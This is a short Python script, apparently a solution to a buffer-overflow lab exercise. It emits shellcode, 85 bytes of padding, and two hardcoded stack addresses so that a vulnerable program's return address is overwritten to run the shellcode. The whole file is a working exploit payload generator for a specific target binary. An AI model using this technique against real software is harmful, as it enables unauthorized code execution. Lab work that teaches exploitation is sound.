#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"a" * 85)
sys.stdout.buffer.write(pack("<II", 0xfffe8db8, 0xfffe8d2c))
